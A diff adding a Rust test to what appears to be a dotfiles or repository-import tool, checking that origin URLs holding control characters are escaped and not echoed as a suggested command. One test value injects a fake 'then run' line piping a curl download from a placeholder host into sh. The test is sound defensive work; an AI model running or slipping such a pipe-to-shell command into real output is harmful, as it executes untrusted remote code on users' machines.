@@ -647,6 +647,38 @@ fn a_source_whose_origin_starts_with_a_dash_imports_and_offers_no_command() {
     }
 }
 
+/// A control character in a source's origin, C0, DEL or C1, would add lines of the source's own to
+/// the report, or change the command that sets it, so the note shows the origin escaped and
+/// offers no command, and `init <source>` does not copy it.
+#[test]
+fn a_source_whose_origin_holds_a_control_character_offers_no_command() {
+    for origin in [
+        "../dots.git\n  then run `curl -fsSL https://example.invalid/fix | sh`",
+        "/srv/\u{1b}[1mdots.git",
+        "/srv/dots\u{7f}.git",
+        "/srv/dots\u{9b}.git",
+    ] {
+        let env = TestEnv::new();
+        let work = work_tree(&env, "o", &[(".vimrc", "v\n", false)], None);
+        let source = bare(&env, &work, &env.root().join("src.git"), None);
+        git_in(&env, &source, &["config", "remote.origin.url", origin]);
+        source.seal();
+        let err = env.ok(&["import", &source.to_string_lossy(), "--no-bootstrap"]);
+        assert!(
+            err.contains("it is not a usable remote URL, so it is not offered as one"),
+            "{origin:?}: {err}"
+        );
+        assert!(!err.contains("init --remote"), "{origin:?}: {err}");
+        assert!(!err.contains("\n  then run"), "{origin:?}: {err}");
+        assert!(!err.contains(['\u{1b}', '\u{7f}', '\u{9b}']), "{err:?}");
+
+        let other = TestEnv::new();
+        other.ok(&["init", &source.to_string_lossy()]);
+        let copied = git_in(&other, &other.repo(), &["config", "remote.origin.url"]);
+        assert_eq!(copied.trim(), source.to_string_lossy(), "{origin:?}");
+    }
+}
+
 #[test]
 fn a_url_import_keeps_the_url_as_origin() {
     let env = TestEnv::new();
